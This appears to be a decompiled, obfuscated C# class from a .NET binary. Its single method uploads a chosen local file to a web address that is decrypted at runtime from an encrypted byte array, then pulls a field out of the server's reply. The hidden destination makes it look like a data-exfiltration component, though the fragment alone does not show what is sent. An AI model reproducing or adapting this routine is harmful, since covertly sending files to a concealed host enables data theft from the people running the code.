using System;
using System.Net;
using System.Text;
using ns2;

namespace ns14;

internal sealed class Class60
{
	public static string smethod_0(string string_0, bool bool_0 = false)
	{
		try
		{
			using WebClient webClient = new WebClient();
			byte[] bytes = webClient.UploadFile(Class10.smethod_1(new byte[48]
			{
				4, 203, 201, 210, 147, 242, 36, 225, 66, 42,
				36, 218, 27, 178, 235, 223, 170, 114, 211, 210,
				237, 234, 99, 134, 41, 195, 235, 18, 139, 139,
				53, 239, 207, 253, 34, 1, 192, 176, 118, 47,
				164, 23, 131, 62, 62, 37, 108, 32
			}) + (bool_0 ? Class10.string_2 : ""), string_0);
			string @string = Encoding.ASCII.GetString(bytes);
			if (!@string.Contains("\"error\": {"))
			{
				return @string.Split(new char[1] { '"' })[15];
			}
			Console.WriteLine(@string);
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		return null;
	}
}
